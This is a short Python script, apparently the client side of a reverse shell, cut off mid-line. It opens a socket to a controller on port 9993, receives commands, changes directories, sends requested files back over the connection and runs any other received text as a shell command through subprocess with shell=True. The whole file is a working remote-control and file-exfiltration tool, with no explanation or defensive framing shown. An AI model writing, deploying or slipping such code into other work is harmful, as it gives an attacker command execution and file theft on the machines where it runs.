import sys
import subprocess
import os
import socket
s = socket.socket()
host = socket.gethostname()
port = 9993
s.connect((host,port))

while True:
    
    data = s.recv(1024)
    data = data.decode("utf-8")
    if data[:2] == "cd":
        try:
            os.chdir(data[3:])
            cwd = os.getcwd() +" > "
            s.send(str.encode(cwd))
        except FileNotFoundError:
            cwd = os.getcwd() +" > "
            s.send(str.encode("Directory does not exist\n " + cwd))

    elif data[:4] == "quit":
        s.close()
            
    elif data[:4] == "getf":
        filename = data[5:]
        f = open(filename,'rb')
        l = f.read(1024)
        #while (l):
        s.send(l)
        print('Sent ',repr(l))
           #l = f.read(1024)
        f.close()

    elif len(data) > 0:
        cmd = subprocess.Popen(data[:],shell=True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_